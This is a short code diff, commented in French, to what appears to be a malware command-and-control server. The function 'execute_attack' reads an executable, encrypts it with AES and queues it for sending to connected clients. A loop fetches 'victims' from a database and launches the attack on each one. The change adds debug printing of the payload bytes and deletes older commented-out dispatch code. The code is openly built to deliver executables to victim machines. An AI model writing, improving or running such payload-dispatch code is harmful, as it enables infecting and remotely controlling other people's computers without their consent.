@@ -137,7 +137,12 @@ def execute_attack(client, data):
             if os.path.isfile(executable_path):
                 with open(executable_path, 'rb') as f:
                     executable_data = f.read()
-                    cipher_text = cipher_enc.encrypt(pad(executable_data, AES.block_size))
+                    print("données de l'exécutable : " + str(executable_data))
+                    print(" ################ clearbytes : ")
+                    for byte in executable_data:
+                        print(int(byte), end=' ')
+                    cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+                    cipher_text = cipher.encrypt(pad(executable_data, AES.block_size))
                     client['emission_queue'].put(cipher_text)
                     print("L'exécutable a été envoyé")
             else:
@@ -884,20 +889,8 @@ elif args.start:
                 victims = mycursor.fetchall()
 
                 for victim in victims:
-                    
                     victim_uid = victim[0]
-
                     for client in clients:
-                        # if client['uid'] == victim_uid:
-                        #     print("sending attack to " + str(client['addr']))
-
-                        #     data_to_send = format_attack_data(data)
-
-                        #     # Envoi de l'attaque à l'ordinateur
-                        #     cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                        #     cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
-
-                        #     client['emission_queue'].put(cipher_text)
                         execute_attack(client, data)
 
                 # Mise à jour de l'attaque
